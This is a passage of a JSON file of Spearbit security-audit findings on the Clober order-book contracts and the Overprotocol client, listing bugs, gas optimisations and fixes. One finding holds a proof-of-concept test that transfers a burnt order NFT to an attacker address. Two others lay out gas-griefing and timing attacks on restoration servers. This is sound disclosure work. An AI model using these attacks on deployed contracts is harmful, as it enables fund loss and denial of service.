        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Claim functionality is designed to support 3rd party operators to claim multiple orders on behalf of market's users to finalise the transactions, deliver assets and earn bounties. The code allows to iterate over a list of orders to execute _claim. function claim(address claimer, OrderKey[] calldata orderKeys) external nonReentrant revertOnDelegateCall { uint32 totalBounty = 0; for (uint256 i = 0; i < orderKeys.length; i++) { ... (uint256 claimedTokenAmount, uint256 minusFee, uint64 claimedRawAmount) = _claim( queue, mOrder, orderKey, claimer ); ... } } However, neither claim nor _claim functions in OrderBook support skipping already fulfilled orders. On the con- trary in case of a revert in _claim the whole transaction is reverted. function _claim(...) private returns (...) { ... require(mOrder.openOrderAmount > 0, Errors.OB_INVALID_CLAIM); ... } Such implementation does not support fully the initial idea of 3rd party operators claiming orders in batches. A transaction claiming multiple orders at once can easily clash with others and be reverted completely, effectively claiming nothing - just wasting gas. Clashing can happen for instance when two bots got overlapping lists of orders or when the owner of the order decides to claim or cancel his/her order manually while the bot is about to claim it as well. 15",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Order owner isn't zeroed after burning",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The order's owner is not zeroed out when the NFT is burnt. As a result, while the onBurn() method records the NFT to have been transferred to the zero address, ownerOf() still returns the current order's owner. This allows for unexpected behaviour, like being able to call approve() and safeTransferFrom() functions on non-existent tokens. A malicious actor could sell such resurrected NFTs on secondary exchanges for profit even though they have no monetary value. Such NFTs will revert on cancellation or claim attempts since openOrderAmount is zero. function testNFTMovementAfterBurn() public { _createOrderBook(0, 0); address attacker2 = address(0x1337); // Step 1: make 2 orders to avoid bal sub overflow when moving burnt NFT in step 3 uint256 orderIndex1 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); CloberOrderBook.OrderKey memory orderKey = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex1 }); uint256 tokenId = orderToken.encodeId(orderKey); // Step 2: burn 1 NFT by cancelling one of the orders vm.startPrank(Constants.MAKER); orderBook.cancel( Constants.MAKER, _toArray(orderKey) ); // verify ownership is still maker assertEq(orderToken.ownerOf(tokenId), Constants.MAKER, \"NFT_OWNER\"); // Step 3: resurrect burnt token by calling safeTransferFrom orderToken.safeTransferFrom( Constants.MAKER, attacker2, tokenId ); // verify ownership is now attacker2 assertEq(orderToken.ownerOf(tokenId), attacker2, \"NFT_OWNER\"); }",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Lack of two-step role transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The contracts lack two-step role transfer. Both the ownership of the MarketFactory as well as the change of market's host are implemented as single-step functions. The basic validation whether the address is not a zero address for a market is performed, however the case when the address receiving the role is inaccessible is not covered properly. Taking into account the handOverHost can be invoked without any supervision, by anyone who created the market it is possible to make a typo unintentionally or intentionally if the attacker wants simply to brick fees collection as currently the host affects collectFees in OrderBook (described as a separate issue). The ownership transfer in theory should be less error-prone as it should be done by DAO with great care, however still two-step role transfer should be preferable.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Atomic fees delivery susceptible to funds lockout",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The collectFees function delivers the quoteToken part of fees as well as the baseToken part of fees atomically and simultaneously to both the DAO and the host. In case a single address is for instance blacklisted (e.g. via USDC blacklist feature) or a token in a pair happens to be malicious and configured the way transfer to one of the addresses reverts it is possible to block fees delivery. 17 function collectFees() external nonReentrant { // @audit delivers both tokens atomically require(msg.sender == _host(), Errors.ACCESS); if (_baseFeeBalance > 1) { _collectFees(_baseToken, _baseFeeBalance - 1); _baseFeeBalance = 1; } if (_quoteFeeBalance > 1) { _collectFees(_quoteToken, _quoteFeeBalance - 1); _quoteFeeBalance = 1; } } function _collectFees(IERC20 token, uint256 amount) internal { // @audit delivers to both wallets uint256 daoFeeAmount = (amount * _DAO_FEE) / _FEE_PRECISION; uint256 hostFeeAmount = amount - daoFeeAmount; _transferToken(token, _daoTreasury(), daoFeeAmount); _transferToken(token, _host(), hostFeeAmount); } There are multiple cases when such situation can happen for instance: a malicious host wants to block the function for DAO to prevent collecting at least guaranteed valuable quoteToken or a hacked DAO can swap treasury to some invalid address and renounce ownership to brick collectFees across multiple markets. Taking into account the current implementation in case it is not possible to transfer tokens it is necessary to swap the problematic address, however depending on the specific case it might be not trivial.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "DAO fees potentially unavailable due to overly strict access control",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The collectFees function is guarded by an inline access control require statement condition which prevents anyone, except a host, from invoking the function. Only the host of the market is authorized to invoke, effectively deliver all collected fees, including the part of the fees belonging to the DAO. function collectFees() external nonReentrant { require(msg.sender == _host(), Errors.ACCESS); // @audit only host authorized if (_baseFeeBalance > 1) { _collectFees(_baseToken, _baseFeeBalance - 1); _baseFeeBalance = 1; } if (_quoteFeeBalance > 1) { _collectFees(_quoteToken, _quoteFeeBalance - 1); _quoteFeeBalance = 1; } } This access control is too strict and can lead to funds being locked permanently in the worst case scenario. As the host is a single point of failure in case access to the wallet is lost or is incorrectly transferred the fees for both the host and the DAO will be locked.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "OrderNFT ownership and market host transfers are done separately",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The market host is entitled to 80% of the fees collected, and is able to set the URI of the correspond- ing orderToken NFT. However, transferring the market host and the orderToken NFT is done separately. It is thus possible for a market host to transfer one but not the other.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OrderNFTs can be renamed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The OrderNFT contract's name and symbol can be changed at any time by the market host. Usually, these fields are immutable for ERC721 NFTs. There might be potential issues with off-chain indexers that cache only the original value. Furthermore, suddenly renaming tokens by a malicious market host could lead to web2 phishing attacks.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "DOSing _replaceStaleOrder() due to reverting on token transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "In the case of tokens with implemented hooks, a malicious order owner can revert on token received event thus cause a denial-of-service via _replaceStaleOrder(). The probability of such an attack is very low, because the order queue has to be full and it is unusual for tokens to implement hooks.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Total claimable bounties may exceed type(uint32).max",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Individual bounties are capped to type(uint32).max which is ~4.295 of a native token of 18 decimals (4.2949673e18 wei). It's possible (and likely in the case of Polygon network) for their sum to therefore exceed type(uint32).max.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Can fake market order in TakeOrder event",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Market orders in Orderbook.marketOrder set the 8-th bit of options. This options value is later used in _take's TakeOrder event. However, one can call Orderbook.limitOrder with this 8-th bit set and spoof a market order event.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_priceToIndex will revert if price is type(uint128).max",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Because price is type uint128, the increment will overflow first before it is casted to uint256 uint256 shiftedPrice = uint256(price + 1) << 64;",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "using block.chainid for create2 salt can be problematic if there's chain hardfork",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Using block.chainid as salt for create2 can result in inconsistency if there is a chain split event(eg. eth2 merge). This will make 2 different chains that has different chainid(one with original chain id and one with random new value). Which will result in making one of the chains not able to interact with markets, nfts properly. Also, it will make things hard to do a fork testing which changes chainid for local environment.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use get64Unsafe() when updating claimable in take()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "get64Unsafe() can be used when fetching the stored claimable value since _getClaimableIndex() returns elementIndex < 4",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Check is zero is cheaper than check if the result is a concrete value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Checking if the result is zero vs. checking if the result is/isn't a concrete value should save 1 opcode.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Function argument can be skipped",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The address caller parameter in the internal _cancel function can be replaced with msg.sender as effectively this is the value that is actually used when the function is invoked.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant flash loan balance cap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The requested flash loan amounts are checked against and capped up to the contract's token bal- ances, so the caller has to validate and handle the case where the tokens received are below the requested amounts. It would be better to optimize for the success case where there are sufficient tokens. Otherwise, let the function revert from failure to transfer the requested tokens instead.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Do direct assignment to totalBaseAmount and totalQuoteAmount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "While iterating through multiple claims, totalBaseAmount and totalQuoteAmount are reset and as- signed a value each iteration. Since they are only incremented in the referenced block (and are mutually exclusive cases), the assignment can be direct instead of doing an increment.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant zero minusFee setter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "minusFee defaults to zero, so the explicit setting of it is redundant.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Load _FEE_PRECISION into local variable before usage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Loading _FEE_PRECISION into a local variable slightly reduced bytecode size (0.017kB) and was found to be a tad more gas efficient.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Can cache value difference in SegmentedSegmentTree464.update",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The replaced - value expression in SegmentedSegmentTree464.pop is recomputed several times in each loop iteration.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary loop condition in pop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The loop variable l in SegmentedSegmentTree464.pop is an unsigned int, so the loop condition l >= 0 is always true. The reason why it still terminates is that the first layer only has group index 0 and 1, so the rightIndex.group - leftIndex.group < 4 condition is always true when the first layer is reached, and then it terminates with the break keyword.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use same comparisons for children in heap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The pop function compares one child with a strict inequality (<) and the other with less than or equals (<=). A heap doesn't guarantee order between the children and there are no duplicate nodes (wordIndexes).",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "No need for explicit assignment with default values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Explicitly assigning ZERO value (or any default value) costs gas, but is not needed.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Prefix increment is more efficient than postfix increment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The prefix increment reduces bytecode size by a little, and is slightly more gas efficient.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Tree update can be avoided for fully filled orders",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "For fully filled orders, remainingAmount will be 0 (openOrderAmount == claimedRawAmount), so the tree update can be skipped since the new value is the same as the old value. Hence, the code block can be moved inside the if (remainingAmount > 0) code block.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Shift msg.value cap check for earlier revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The cap check on msg.value should be shifted up to the top of the function so that failed checks will revert earlier, saving gas in these cases.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Solmate's ReentrancyGuard is more efficient than OpenZeppelin's",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Solmate's ReentrancyGuard provides the same functionality as OpenZeppelin's version, but is more efficient as it reduces the bytecode size by 0.11kB, which can be further reduced if its require statement is modified to revert with a custom error.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "r * r is more gas efficient than r ** 2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "It's more gas efficient to do r * r instead of r ** 2, saving on deployment cost.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Update childHeapIndex and shifter initial values to constants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The initial values of childHeapIndex and shifter can be better hardcoded to avoid redundant operations.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Same value tree update falls under else case which will do redundant overflow check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "In the case where value and replaced are equal, it currently will fall under the else case which has an addition overflow check that isn't required in this scenario. In fact, the tree does not need to be updated at all.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unchecked code blocks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The mentioned code blocks can be performed without native math overflow / underflow checks because they have been checked to be so, or the min / max range ensures it.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unused Custom Error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "error TreeQueryIndexOrder(); is defined but unused.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Markets with malicious tokens should not be interacted with",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The Clober protocol is permissionless and allows anyone to create an orderbook for any base token. These base tokens can be malicious and interacting with these markets can lead to loss of funds in several ways. For example, a token with custom code / a callback to an arbitrary address on transfer can use the pending ETH that the victim supplied to the router and trade it for another coin. The victim will lose their ETH and then be charged a second time using their WETH approval of the router.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Claim bounty of stale orders should be given to user instead of daoTreasury",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "When an unclaimed stale order is being replaced, the claimBounty is sent to the DAO treasury. However, since the user is the one executing the claim on behalf of the stale order owner, and is paying the gas for it, the claimBounty should be sent to him instead.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Misleading comment on remainingRequestedRawAmount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The comment says // always ceil, but remainingRequestedRawAmount is rounded down when the base / quote amounts are converted to the raw amount.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Potential DoS if quoteUnit and index to price functions are set to unreasonable values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "There are some griefing and DoS (denial-of-service) attacks for some markets that are created with bad quoteUnit and pricing functions. 1. A market order uses _take to iterate over several price indices until the order is filled. An attacker can add a tiny amount of depth to many indices (prices), increasing the gas cost and in the worst case leading to out-of-gas transactions. 2. There can only be MAX_ORDER_SIZE (32768) different orders at a single price (index). Old orders are only replaced if the previous order at the index has been fully filled. A griefer or a market maker trying to block their competition can fill the entire order queue for a price. This requires 32768 * quoteUnit quote tokens.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rounding rationale could be better clarified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The rationale for rounding up / down was easier to follow if tied to the expendInput option instead.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename flashLoan() for better composability & ease of integration",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "For ease of 3rd party integration, consider renaming to flash(), as it would then have the same function sig as Uniswap V3, although the callback function would still be different.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unsupported tokens: tokens with more than 18 decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The orderbook does currently not support tokens with more than 18 decimals. However, having more than 18 decimals is very unusual.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "ArithmeticPriceBook and GeometricPriceBook contracts should be abstract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The ArithmeticPriceBook and GeometricPriceBook contracts don't have any external functions.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "childRawIndex in OctopusHeap.pop is not a raw index",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The OctopusHeap uses raw and heap indices. Raw indices are 0-based (root has raw index 0) and iterate the tree top to bottom, left to right. Heap indices are 1-based (root has heap index 0) and iterate the head left to right, top to bottom, but then iterate the remaining nodes octopus arm by arm. A mapping between the raw index and heap index can be obtained through _convertRawIndexToHeapIndex. The pop function defines a childRawIndex but this variable is not a raw index, it's actually raw index + 1 (1-based). 30",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Lack of orderIndex validation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The orderIndex parameter in the OrderNFT contract is missing proper validation. Realistically the value should never exceed type(uint232).max as it is passed from the OrderBook contract, however, future changes to the code might potentially cause encoding/decoding ambiguity.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unsafe _getParentHeapIndex, _getLeftChildHeapIndex",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "When heapIndex = 1 _getParentHeapIndex(uint16 heapIndex) would return 0 which is an invalid heap index. when heapIndex = 45 _getLeftChildHeapIndex(uint16 heapIndex) would return 62 which is an invalid heap index.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "_priceToIndex function implemented but unused",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The _priceToIndex function for the price books are implemented but unused.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect _MAX_NODES and _MAX_NODES_P descriptions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The derivation of the values _MAX_NODES and MAX_NODES_P in the comments are incorrect. For _MAX_NODES C * ((S *C) ** L-1)) = 4 * ((2 * 4) ** 3) = 2048 is missing the E, or replace S * C with N. The issue isn't entirely resolved though, as it becomes C * (S * C * E) ** (L - 1) = 4 * (2 * 4 * 2) ** 3 = 16384 or 2 ** 14 Same with _MAX_NODES_P",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "marketOrder() with expendOutput reverts with SlippageError with max tolerance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "During the audit the Clober team raised this issue. Added here to track the fixes.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Wrong OrderIndex could be emitted at Claim() event.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "During the audit the Clober team raised this issue. Added here to track the fixes.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A malicious entity can grieve Restoration Servers for their funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "Due to the location of the CanTransfer() check in (evm *EVM) Restore() it is possible for a ma- licious entity to grieve honest restoration servers for significant amount of gas. This can become a more serious issue if a large portion of restoration servers run out of gas and their accounts expire before owners realize. A competing restoration server may want to do this to harm its competition. An example attack could be a malicious actor creating a large number of accounts (100+) and seeding them all with 10 OVER. It would then need to let some time pass and the accounts go dormant (the longer the accounts are dormant the larger the restoration proof and the more effective this attack will be). The entity then could create its own restoration proofs with the fees costing the entire 10 OVER for each account. This would effectively collect all of the account balances into its own account. It could wait until it either controls a validator that is the proposer for the next block or it can use increased priority fees to make sure that its transactions are placed early in the next block. It can send all of its own restorationTX's at the same time that it makes restoration requests to all of other known restoration servers in the network. The remaining honest restoration servers will query their local nodes that will not have their state updated yet with the malicious entity's self created restorationTX's. All checks will pass including checkFeePayable() which will see 10 OVER in each account. The honest restoration servers will all create and submit restorationTX's for the 100+ accounts. By the time they are processed by the EVM the malicious entities restorationTX's will have already processed and the victim restoration servers' restorationTX's will fail at the requestors balance check in (evm *EVM) Restore(). When this happens all of the honest restoration servers' gas will be consumed: // The sender of the restore data has to have enough balance to send the restoration fee if restoreData.FeeRecipient != nil && restoreData.Fee.Sign() != 0 { if !evm.Context.CanTransfer(evm.StateDB, sender, restoreData.Fee) { err = ErrInsufficientBalance } else { evm.Context.Transfer(evm.StateDB, sender, *restoreData.FeeRecipient, restoreData.Fee) } } if err != nil { evm.StateDB.RevertToSnapshot(snapshot) if err != ErrExecutionReverted { gas = 0 } } The result of this attack is that the restoration servers will have their gas funds burned without being able to recoup the fees require to cover their loss. It its current form the max gas that can be grieved is only limited by the base fee and and the size of the proof (length of time the account has been dormant). Using hundreds or thousands of accounts requiring large proofs can enable an attacker to trick honest restoration servers from burn all of their balances in gas.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Precisely timed malicious restoration requests can grieve restoration servers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "In order to execute a restoration transaction, the restoreDataSigner.Sender account that signed and sent the restoreData request must have sufficient balance to cover the fee. However, there is no check to make sure that the restoreDataSigner.Sender account actually exists in the current state. If that account has been expired from the state, the transaction will fail upon checking CanTransfer, and the gas paid by the honest restoration server will be burned without any repercussions to the restoreDataSigner.Sender account. Therefore it is possible to execute a timing attack where the restoreDataSigner.Sender account exists when the restoration server verifies a request but then expires from the state before the restoration transaction gets executed in the EVM. For example, I have an account we'll call \"malicious account\" that has been inactive for 2*SweepEpoch - 1 blocks. This account will expire on the next epoch. In the last slot of that epoch before expiration, the \"malicious account\" will sign and send a valid restoreData request for any expired account to an honest restoration server. The restoration server will generate the valid proof and send a valid restoration transaction for this request. By the time this restoration transaction gets executed in the EVM (which would be in the next slot), the \"malicious account\" will have expired. The \"malicious account\" will not have to pay any fee while costing the restoration server all of the gas of the transaction which could be made to be very large. If this got scaled up similar to a scenario described in the issue \"A malicious entity can grieve OVER network Restoration Servers for their funds\", then this could cause some problems. Though this scenario is similar, the source and trigger of the vulnerability is unique and requires its own solution. It is also a more constrained attack scenario, requiring correct timing on the epoch boundary. But each slot is 12 seconds, and I believe that is plenty of time to execute this with reasonable expectations of success.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Ignored returned gas and nonce update in Create*WithUiHash",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "If a call to precompiled contracts createContractWithUiHash or create2ContractWithUiHash fails before attempting to deploy the new contract code, the remaining gas returned will all be burned due to checks in evm.Call which that consume all gas on error. There are 6 locations where an error could happen and the call attempts to return gas:  core/vm/evm.go#L621  core/vm/evm.go#L624  core/vm/evm.go#L727  core/vm/evm.go#L734  core/vm/evm.go#L750  core/vm/evm.go#L757 In each of these locations, an error happens and it attempts to return the gas. However, the gas returned here will get consumed anyways due to the fact that that it is a precompile. We can see this gas consumption functions behavior in the function evm.Call at core/vm/evm.go#L259-L263 (as well as in the other call evm.CallCode/evm.DelegateCall/evm.StaticCall). This means that any failures in the call to the precompiled contracts will always consume all gas if the failure is not a REVERT and it fails before attempting to deploy the code. This differs from the CREATE/CREATE2 functionality which would return any leftover gas. there is another In addition to this issue, issue with the snapshotting and reverting happening twice when a REVERT occurs, once in evm.Call at core/vm/evm.go#L260 and once in evm.createWithUi at core/vm/evm.go#L693. This is an issue for two reasons - it doubles the amount of work when reverting, and the evm.Call revert also reverts the updated Nonce at core/vm/evm.go#L737 and the updated access list at core/vm/evm.go#L629.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "REVERT will not return remaining gas in Create*WithUiHash",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "If a REVERT opcode were executed during contract deployment in a createContractWithUiHash or create2ContractWithUiHash precompile call, the expectation is that the rest of the not-yet-consumed gas will be returned. There is even a special check in evm.createWithUiHash (see core/vm/evm.go#L693-L695) that ensures that the REVERT opcode has the privilege of getting gas back. This is also the behavior of evm.create and evm.Call. However, the createContractWithUiHash and create2ContractWithUiHash precompiles both ignore the returned gas value if there is any error in the evm.CreateWithUiHash and evm.Create2WithUiHash operations. On error, they instead return 0 gas, burning any leftover gas. You can see this behavior at core/vm/contracts.go#L695-L697 and at core/vm/contracts.go#L727-L729. It's not super common to execute a REVERT inside of contract deployment code, but it does happen. Burning all of the gas on REVERT in contract deployment code is unexpected behavior.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Database#Recoverable does not use ckptRoot parameter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "The ckptRoot parameter is not used in this function. I'm a little concerned that we might be missing a check here.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Check for empty restoration proof only does nil check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "tyRestorationProof, indicates that msg.Data should not be empty, but the check only ensures the field is not nil. This will allow an empty byte slice, []byte{}, though. I think we should disallow this too.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Restoration clients with unknown SourceEpoch cannot restore",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
